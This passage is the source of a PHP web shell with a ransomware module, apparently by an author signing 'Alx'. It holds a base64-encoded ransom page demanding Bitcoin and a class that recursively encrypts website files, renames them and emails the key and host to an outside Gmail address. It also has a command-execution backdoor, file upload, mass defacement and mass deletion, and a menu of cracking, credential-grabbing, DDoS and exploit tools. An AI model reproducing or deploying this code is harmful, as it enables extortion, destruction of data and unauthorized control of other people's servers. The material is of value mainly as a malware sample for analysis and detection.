2Nlc3NpYmVsCgkJYmVjYXVzZSB0aGV5IGhhdmUgYmVlbiBlbmNyeXB0ZWQuIE1heWJlIHlvdSBhcmUgYnVzeSBsb29raW5nIGZvciBhIHdheSB0byAKCQlyZWNvdmVyIHlvdXIgZmlsZXMsIGJ1dCBkbyBub3Qgd2FzdGUgeW91ciB0aW1lISBOb2JvZHkgY2FuIGRlY3J5cHQgeW91ciBmaWxlcwoJCXdpdGhvdXQgb3VyIHNwZWNpYWwgZGVjcnlwdGlvbiBzZXJ2aWNlLgoJCTxicj4KCQk8YnI+CgkJPGRpdiBpZD0iY29udGVudC1qdWR1bCI+CgkJPHU+PGI+Q2FuIGkgcmVjb3ZlciBteSB3ZWJzaXRlID88L3U+PC9iPjwvc3R5bGU+PGJyPgoJCTwvZGl2PgoJCVN1cmUsIHdlIGd1YXJhbnRlZSB0aGF0IHlvdSBjYW4gcmVjb3ZlciBhbGwgeW91ciBmaWxlcyBzYWZlbHkgYW5kIGVhc2lseS4gQnV0IHlvdSBoYXZlIG5vdCBlbm91Z2ggdGltZS4KCQlZb3UgY2FuIGRlY3J5cHQgYWxsIHlvdXIgd2Vic2l0ZSBmaWxlIHNhZmVseSwgaG93ID8gWW91IG11c3QgcGF5IHdpdGggQml0Y29pbi4KCQk8YnI+CgkJPGJyPgoJCTxkaXYgaWQ9ImNvbnRlbnQtanVkdWwiPgoJCTx1PjxiPkhvdyBkbyBpIHBheSA/PC91PjwvYj48L3N0eWxlPjxicj4KCQk8L2Rpdj4KCQlQYXltZW50IGlzIGFjY2VwdGVkIHdpdGggQml0Y29pbiBvbmx5LCB3ZSBhcmUgbm90IHVzaW5nIFBheXBhbCwgQ0MsIGV0Yy4gRm9yIG1vcmUgaW5mb3JtYXRpb24KCQlwbGVhc2UgY2xpY2sgW0Fib3V0IEJpdENvaW5dLgoJCUZvciBtb3JlIGluZm9ybWF0aW9uLCBjbGljayBbSG93IHRvIGJ1eSBCaXRDb2luXQoJCUFuZCBzZW5kIHRoZSBjb3JyZWN0IGFtb3VudCB0byB0aGUgYWRkcmVzcyBzcGVjaWZpZWQgaW4gYmVsb3cKCQlBZnRlciB5b3VyIHBheW1lbnQsIHNlbmQgcGF5bWVudCByZWNlaXB0IHRvIGVtYWlsIGFkZHJlc3MgW0NvbnRhY3QgVXNdLCBhbmQgd2Ugd2lsbCBzZW5kIHVubG9jayBrZXkgdG8geW91LgoJCTxicj4KCQk8YnI+CgkJPGRpdiBpZD0iY29udGVudC1qdWR1bCI+CgkJPHU+PGI+Q29udGFjdCA/PC91PjwvYj48L3N0eWxlPjxicj4KCQk8L2Rpdj4KCQlJZiB5b3UgbmVlZCBvdXIgYXNzaXN0YW5jZSwgc2VuZCBhIG1lc3NhZ2UgYnkgY2xpY2tpbmcgW0NvbnRhY3QgVXNdCgkJPC9kaXY+CgkJPGJyPgoJPGRpdiBpZD0iaXNpLXdpbmRvdyI+Cgk8ZGl2IGlkPSJpc2ktZ2FtYmFyIj48aW1nIHNyYz0iaHR0cHM6Ly8xLmJwLmJsb2dzcG90LmNvbS8tQTZ1RFI4UFNzVm8vV2MwQklwcUVzUkkvQUFBQUFBQUFBaVkvQmUzclpjUDF4VTgxZlVZcEw2aDNDRDdXX29kcDBXclhRQ0xjQkdBcy9zMTYwMC9CaXRjb2luX0FjY2VwdGVkX0hlcmVfUm91bmRfQm9yZGVyLTQ4MDBweC5wbmciIGhlaWdodD0iNzVweCIgd2lkdGg9IjIwMHB4IiBhbGluZz0ibGVmdCI+PC9kaXY+Cgk8ZGl2IGlkPSJpc2kta29sb20iPgoJCQkJUGF5bWVudCAwLjAwNSBCVEMgPTwvZm9udD48Zm9udCBjb2xvcj0ieWVsbG93Ij4gMThRZEthNVJQRlBVR001SmVIMUF1NUNCMll6b1FDNzdBTTwvZm9udD48YnI+CgkJCQk8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBzdHlsZT0iIHRleHQtYWxpZ246IGNlbnRlcjsiPgoJCQkJCQkJPGxhYmVsPktleSA6IDwvbGFiZWw+CgkJCQkJCQk8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0ia2V5IiBjbGFzcz0iaW5wdXRlIiBwbGFjZWhvbGRlcj0ieW91ciB1bmxvY2sga2V5Ij4KCQkJCQkJCTxidXR0b24gb25jbGljaz0ibXlGdW5jdGlvbigpIj5VTkxPQ0sgU0lURTwvYnV0dG9uPgoJCQkJCQkJPHNjcmlwdD4KCQkJCQkJCWZ1bmN0aW9uIG15RnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgdHh0OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNvbmZpcm0oIllvdXIgcGF5bWVudCBpbmZvcm1hdGlvbiB3YXMgbm90IGNvcnJlY3QhLiBJZiB5b3Ugd2FudCBvdXIgaGVscCwgcGxlYXNlIGNvbnRhY3QgdXMgb24gbWFpbCBiZWxvdyEiKSA9PSB0cnVlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0eHQgPSAiWW91IHByZXNzZWQgT0shIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgIHR4dCA9ICJZb3UgcHJlc3NlZCBDYW5jZWwhIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZGVtbyIpLmlubmVySFRNTCA9IHR4dDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoJCQkJCQkgICA8L3NjcmlwdD4KCQkJCQkJPC9mb3JtPgkKCQkJCQkgCgkJCQkJCQkJCQkKCTwvZGl2PgoJPC9kaXY+CQoJPGJyPgoJPGJyPgoJPGNlbnRlcj4KCTxkaXYgaWQ9ImhhY2tlZCI+PG1hcnF1ZWUgc2Nyb2xsYW1vdW50PSI1IiBzY3JvbGxkZWxheT0iNTAiIHdpZHRoPSI4MCUiPgoJPGZvbnQgY29sb3I9ImxpbWUiIGZhY2U9ImdvdGhpYyIgc2l6ZT0iNCI+PC9mb250PjwvbWFycXVlZT48L2ZvbnQ+Cgk8YXVkaW8gYXV0b3BsYXkgbG9vcD4gPHNvdXJjZSBzcmM9Imh0dHBzOi8vYXJjaGl2ZS5vcmcvZG93bmxvYWQvUmVkQWxlcnRfMjAxOTA0L1JlZCUyMEFsZXJ0Lm1wMyIgdHlwZT0iYXVkaW8vbXBlZyI+PC9hdWRpbz4KPC9odG1sPg=="))){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  index.php (Default Page)<br>';
      }
    }
   }
   public function shcpackUnstall(){
      if( file_exists(".htaALx") ){
        if( unlink(".htaccess") && unlink("index.php") ){
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> index.php (Default Page)<br>';
        }
        rename(".htaALx", ".htaccess");
      }
   }
   public function plus(){
      flush();
      ob_flush();
   }
   public function locate(){
        return getcwd();
    }
   public function shcdirs($dir,$method,$key){
        switch ($method) {
          case '1':
            deRanSomeware::shcpackInstall();
          break;
          case '2':
           deRanSomeware::shcpackUnstall();
          break;
        }
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                $locate = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($locate)){
                   if(  deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"index.php")  && deRanSomeware::kecuali($locate,"404.php") && deRanSomeware::kecuali($locate,"404.phtml") && deRanSomeware::kecuali($locate,"404.html")  && deRanSomeware::kecuali($locate,"404.aspx") &&  deRanSomeware::kecuali($locate,"alx.php") && deRanSomeware::kecuali($locate,"alx.phtml") && deRanSomeware::kecuali($locate,"alx.html") && deRanSomeware::kecuali($locate,"alx.aspx") ){
                     switch ($method) {
                        case '1':
                           deRanSomeware::shcEnCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"1");
                        break;
                        case '2':
                           deRanSomeware::shcDeCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"2");
                        break;
                     }
                   }
                }else{
                  deRanSomeware::shcdirs($locate,$method,$key);
                }
            }
            deRanSomeware::plus();
        }
        deRanSomeware::report($key);
   }
   public function report($key){
        $message.= "=========     Alx    =========\n";
        $message.= "Website : ".$_SERVER['HTTP_HOST'];
        $message.= "Key     : ".$key;
        $message.= "=========  (2017) Alx =========\n";
        $subject = "Report Alx";
        $headers = "From: Alx <alx.wahid@gmail.com>\r\n";
        mail("-- alx.wahid@gmail.com --",$subject,$message,$headers);
   }
   public function shcEnDesDirS($locate,$method){
      switch ($method) {
        case '1':
          rename($locate, $locate.".ALx");
        break;
        case '2':
          $locates = str_replace(".ALx", "", $locate);
          rename($locate, $locates);
        break;
      }
   }
   public function shcEnCry($key,$locate){
      $data = file_get_contents($locate);
      $iv = mcrypt_create_iv(
          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
          MCRYPT_DEV_URANDOM
      );
      $encrypted = base64_encode(
          $iv .
          mcrypt_encrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              $data,
              MCRYPT_MODE_CBC,
              $iv
          )
      );
      if(file_put_contents($locate,  $encrypted )){
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> '.$locate.' <br>';
      }
   }
   public function shcDeCry($key,$locate){
      $data = base64_decode( file_get_contents($locate) );
      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));
      $decrypted = rtrim(
          mcrypt_decrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
              MCRYPT_MODE_CBC,
              $iv
          ),
          "\0"
      );
      if(file_put_contents($locate,  $decrypted )){
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }
   }
   public function kecuali($ext,$name){
        $re = "/({$name})/";
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }
}
if($_POST['submit']){
switch ($_POST['method']) {
   case '1':
      deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
   break;
   case '2':
     deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
   break;
}
}else{
?>
<?php
<center>
<form action="" method="post" style=" text-align: center;">
      <input type="text" name="key" class="inpute" placeholder="KEY ENC/DEC">
      <select name="method" class="selecte">
         <option value="1"><b>ENCRYPT</b></option>
         <option value="2"><b>DECRYPT</b></option>
      </select>
      <input type="submit" name="submit" class="submite" value="LAUNCH!" />
</form> }
</div></head></body>
</html> ?>
<?php
#alx.wahid@gmail.com#
function path() {
	if(isset($_GET['dir'])) {
		$dir = str_replace("\\", "/", $_GET['dir']);
		@chdir($dir);
	} else {
		$dir = str_replace("\\", "/", getcwd());
	}
	return $dir;
}
function color($bold = 1, $colorid = null, $string = null) {
		$color = array(
			"</font>",  			# 0 off
			"<font color='red'>",	# 1 red 
			"<font color='lime'>",	# 2 lime
			"<font color='white'>",	# 3 white
			"<font color='gold'>",	# 4 gold
		);

	return ($string !== null) ? $color[$colorid].$string.$color[0]: $color[$colorid];
}

function OS() {
	return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
}
function windisk() {
	$letters = "";
	$v = explode("\\", path());
	$v = $v[0];
	 foreach(range("A", "Z") as $letter) {
	  	$bool = $isdiskette = in_array($letter, array("A"));
	  	if(!$bool) $bool = is_dir("$letter:\\");
	  	if($bool) {
	   		$letters .= "[ <a href='?dir=$letter:\\'".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">";
	   		if($letter.":" != $v) {
	   			$letters .= $letter;
	   		}
	   		else {
	   			$letters .= color(1, 2, $letter);
	   		}
	   		$letters .= "</a> ]";
	  	}
	}
	if(!empty($letters)) {
		print "Detected Drives $letters<br>";
	}
	if(count($quicklaunch) > 0) {
		foreach($quicklaunch as $item) {
	  		$v = realpath(path(). "..");
	  		if(empty($v)) {
	  			$a = explode(DIRECTORY_SEPARATOR,path());
	  			unset($a[count($a)-2]);
	  			$v = join(DIRECTORY_SEPARATOR, $a);
	  		}
	  		print "<a href='".$item[1]."'>".$item[0]."</a>";
		}
	}
}
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=blue>".$perm."</font>";
	}
}
function r($dir,$perm) {
	if(!is_readable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=blue>".$perm."</font>";
	}
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}

function writeable($path, $perms) {
	return (!is_writable($path)) ? color(1, 1, $perms) : color(1, 2, $perms);
}

function perms($path) {
	$perms = fileperms($path);
	if (($perms & 0xC000) == 0xC000) {
		// Socket
		$info = 's';
	} 
	elseif (($perms & 0xA000) == 0xA000) {
		// Symbolic Link
		$info = 'l';
	} 
	elseif (($perms & 0x8000) == 0x8000) {
		// Regular
		$info = '-';
	} 
	elseif (($perms & 0x6000) == 0x6000) {
		// Block special
		$info = 'b';
	} 
	elseif (($perms & 0x4000) == 0x4000) {
		// Directory
		$info = 'd';
	} 
	elseif (($perms & 0x2000) == 0x2000) {
		// Character special
		$info = 'c';
	} 
	elseif (($perms & 0x1000) == 0x1000) {
		// FIFO pipe
		$info = 'p';
	} 
	else {
		// Unknown
		$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));

	return $info;
}
function hdd($s) {
	if($s >= 1073741824)
	return sprintf('%1.2f',$s / 1073741824 ).' GB';
	elseif($s >= 1048576)
	return sprintf('%1.2f',$s / 1048576 ) .' MB';
	elseif($s >= 1024)
	return sprintf('%1.2f',$s / 1024 ) .' KB';
	else
	return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function getsource($url) {
    $curl = curl_init($url);
    		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $content = curl_exec($curl);
    		curl_close($curl);
    return $content;
}
function bing($dork) {
	$npage = 1;
	$npages = 30000;
	$allLinks = array();
	$lll = array();
	while($npage <= $npages) {
	    $x = getsource("http://www.bing.com/search?q=".$dork."&first=".$npage);
	    if($x) {
			preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
			foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
			$npage = $npage + 10;
			if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
		} else break;
	}
	$URLs = array();
	foreach($allLinks as $url){
	    $exp = explode("/", $url);
	    $URLs[] = $exp[2];
	}
	$array = array_filter($URLs);
	$array = array_unique($array);
 	$sss = count(array_unique($array));
	foreach($array as $domain) {
		echo $domain."\n";
	}
}

function reverse() {
	$response = curl("http://domains.yougetsignal.com/domains.php", TRUE, "remoteAddress=".$GLOBALS['SERVERIP']."&ket=")['response'];
	$response = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $response)))))))))))));
	$explode  = explode(",,", $response);
	unset($explode[0]);

	foreach($explode as $domain) {
		$domain = "http://$domain";
		$domain = str_replace(",", "", $domain);
		$url[] 	= $domain;
		ob_flush();
		flush();
	}

	return $url;
}

function curl($url, $post = false, $data = null) {
    $ch = curl_init($url);
    	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    	  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    	  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    	  curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    	  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    if($post) {
    	  curl_setopt($ch, CURLOPT_POST, true);
    	  curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }
    $curl['exec'] = curl_exec($ch);
	$curl['info'] = curl_getinfo($ch);

	return [
		"info" 		=> $curl['info'],
		"response" 	=> $curl['exec']
	];

		  curl_close($ch);
}
if(get_magic_quotes_gpc()) {
	function alx_ss($array) {
		return is_array($array) ? array_map('alx_ss', $array) : stripslashes($array);
	}
	$_POST = alx_ss($_POST);
	$_COOKIE = alx_ss($_COOKIE);
}

if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$kernel = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=blue>OFF</font>";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=blue>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=blue>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=blue>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=blue>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=blue>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=blue>NONE</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
echo "System: <font color=blue>".$kernel."</font><br>";
echo "User: <font color=blue>".$user."</font> (".$uid.") Group: <font color=blue>".$group."</font> (".$gid.")<br>";
echo "Server IP: <font color=blue>".$ip."</font> | Your IP: <font color=blue>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "HDD: <font color=blue>$used</font> / <font color=blue>$total</font> ( Free: <font color=blue>$freespace</font> )<br>";
echo "Safe Mode: $sm<br>";
echo "Disable Functions: $show_ds<br>";
echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
echo "Current DIR: ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo "&nbsp;&nbsp;[ ".w($dir, perms($dir))." ]";
echo "<hr>";
echo "<center>";
echo "<ul>";
echo "<li><a href='?'>Home</a>*</li><br>";
echo "<li><a href='?dir=$dir&go=upload'>Upload</a>*</li>";
echo "<li><a href='?dir=$dir&go=cmd'>Command</a>*</li>";
echo "<li><a href='?dir=$dir&go=mass_deface'>Mass Deface</a>*</li>";
echo "<li><a href='?dir=$dir&go=mass_delete'>Mass Delete</a>*</li>";
echo "<li><a href='?dir=$dir&go=config'>Config</a>*</li>";
echo "<li><a href='?dir=$dir&go=symconfig'>Config 2</a>*</li>";
echo "<li><a href='?dir=$dir&go=jumping'>Jumping</a>*</li>";
echo "<li><a href='?dir=$dir&go=cp_findcrack'>cPanel Find</a>*</li>";
echo "<li><a href='?dir=$dir&go=cpanel'>cPanel Crack</a>*</li>";
echo "<li><a href='?dir=$dir&go=smtp'>SMTP Grabber</a>*</li>";
echo "<li><a href='?dir=$dir&go=zoneh'>Zone-H</a>*</li>";
echo "<li><a href='?dir=$dir&go=cgi'>CGI Telnet</a>*</li>";
echo "<li><a href='?dir=$dir&go=csrf'>CSRF Online</a>*</li>";
echo "<li><a href='?dir=$dir&go=cmsvuln'>CMS VulnScan</a>*</li>";
echo "<li><a href='?dir=$dir&go=revslider'>Revslider Xploit</a>*</li>";
echo "<li><a href='?dir=$dir&go=whois'>Whois</a>*</li>";
echo "<li><a href='?dir=$dir&go=code'>Code Inject</a>*</li>";
echo "<li><a href='?dir=$dir&go=hash'>Pass Hash</a>*</li>";
echo "<li><a href='?dir=$dir&go=string'>StringTools</a>*</li>";
echo "<li><a href='?dir=$dir&go=admf'>Admin Finder</a>*</li>";
echo "<li><a href='?dir=$dir&go=adminer'>Adminer</a>*</li>";
echo "<li><a href='?dir=$dir&go=symlink'>Symlink</a>*</li>";
echo "<li><a href='?dir=$dir&go=network'>Network</a>*</li>";
echo "<li><a href='?dir=$dir&go=sec'>Safe Mode</a>*</li>";
echo "<li><a href='?dir=$dir&go=fake_root'>Fake Root</a>*</li>";
echo "<li><a href='?dir=$dir&go=passbpass'>Bypass Etc/Pass</a>*</li>";
echo "<li><a href='?dir=$dir&go=dbdump'>DB Dump</a>*</li>";
echo "<li><a href='?dir=$dir&go=auto_edit_user'>Auto Edit User</a>*</li>";
echo "<li><a href='?dir=$dir&go=auto_wp'>WP Auto Edit Title</a>*</li>";
echo "<li><a href='?dir=$dir&go=auto_dwp'>WP Auto Deface</a>*</li>";
echo "<li><a href='?dir=$dir&go=auto_dwp2'>WP Auto Def 2</a>*</li>";
echo "<li><a href='?dir=$dir&go=cpftp_auto'>cP/FTP Auto Deface</a>*</li>";
echo "<li><a href='?dir=$dir&go=hijack'>WP_Hijack</a>*</li>";
echo "<li><a href='?dir=$dir&go=elfinder'>elFinderMass</a>*</li>";
echo "<li><a href='?dir=$dir&go=balitbang'>Balitbang Xploiter</a>*</li>";
echo "<li><a href='?dir=$dir&go=drupal'>Drupal Xploiter</a>*</li>";
echo "<li><a href='?dir=$dir&go=vhost'>Bypass VHost</a>*</li>";
echo "<li><a href='?dir=$dir&go=infosec'>Server Info</a>*</li>";
echo "<li><a href='?dir=$dir&go=krdp_shell'>K-RDP Shell</a>*</li>";
echo "<li><a href='?dir=$dir&go=shellscanner'>Scan Shell</a>*</li>";
echo "<li><a href='?dir=$dir&go=port'>Port Scan</a>*</li>";
echo "<li><a href='?dir=$dir&go=ddos'>DDOS v1</a>*</li>";
echo "<li><a href='?dir=$dir&go=dos'>DDOS v2</a>*</li>";
echo "<li><a href='?dir=$dir&go=zip'>Zip Menu</a>*</li>";
echo "<li><a href='?dir=$dir&go=vips'>Auto Mastah</a>*</li>";
echo "<li><a href='?dir=$dir&go=contact'>Upgrade Tools</a>*</li>";
echo "<li><a href='?dir=$dir&go=log_hunt'>Log-Hunter</a>*</li>";
echo "<li><a style='color: red;' href='?logout=true'>Logout</a>*</li><br>";
echo "</ul>";
echo "</center>";
echo "<hr>";
if($_GET['logout'] == true) {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
} elseif($_GET['go'] == 'upload') {
	echo "<center>";
	if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
				$act = "<font color=blue>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		} else {
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
					$act = "<font color=blue>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
				} else {
					$act = "<font color=red>failed to upload file</font>";
				}
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		}
	}
	echo "Upload File:
	<form method='post' enctype='multipart/form-data'>
	<input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ] 
	<input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
	<input type='file' name='ix_file'>
	<input type='submit' value='upload' name='upload'>
	</form>";
	echo $act;
	echo "</center>";
} elseif($_GET['go'] == 'cmd') {
	echo "<form method='post'>
	<font style='text-decoration: underline;'>".$user."@".$ip.": ~ $ </font>
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}
} elseif($_GET['go'] == 'mass_deface') {
	function wajah_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=blue>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$alx = wajah_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function wajah_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=blue>DONE</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_wajah'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			wajah_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_wajah'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			wajah_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Wajah:</font><br>
	<input type='radio' name='tipe_wajah' value='murah' checked>Biasa<input type='radio' name='tipe_wajah' value='mahal'>Massal<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>ALx was Here..!</textarea><br>
	<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
	</form></center>";
	}
} elseif($_GET['go'] == 'mass_delete') {
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
